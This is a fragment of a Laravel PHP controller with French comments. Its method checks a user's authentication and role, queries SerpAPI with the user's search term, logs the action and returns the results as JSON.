     *         description="Erreur interne lors de la récupération ou de l'enregistrement des données",
     *         @OA\JsonContent(
     *             type="object",
     *             @OA\Property(property="error", type="string", description="Message d'erreur détaillé")
     *         )
     *     )
     * )
     */
    public function crawlerInformation(Request $request)
    {

        $user = Auth::user();

        if (!$user) {
            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
        }

        if (!$this->checkRules(14, $user->role_id)) {
            return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
        }

        $apiKey = env('SERP_API_KEY'); // Récupérer la clé API

        $client = new Client(); // Créer un client HTTP

        $url = "https://serpapi.com/search";

        try {
            $response = $client->get($url, [
                'query' => [
                    'q' => $request->search,         // La requête de recherche
                    'api_key' => $apiKey   // Clé API
                ]
            ]);

            // Récupérer et décoder la réponse JSON
            $result = json_decode($response->getBody(), true);

            try {
                // Enregistrer les données dans la table des logs
                Log::create([
                    'utilisateur_id' => $user->id, // L'ID de l'utilisateur
                    'fonctionnalite_id' => 14,      // ID de la fonctionnalité associée (à personnaliser selon votre logique)
                    'description_action' => "Recuperation de données sur: $request->search", // Enregistrer les données sous forme de texte
                ]);

                // Retourner une réponse JSON confirmant l'enregistrement
                return response()->json(['result' => $result], 200);
            } catch (\Exception $e) {
                // Gérer les erreurs
                return response()->json(['error' => 'Erreur lors de l\'enregistrement des données : ' . $e->getMessage()], 500);
            }

            return $result;
        } catch (\Exception $e) {
            // Gestion des erreurs
            return ['error' => $e->getMessage()];
        }
    }
}
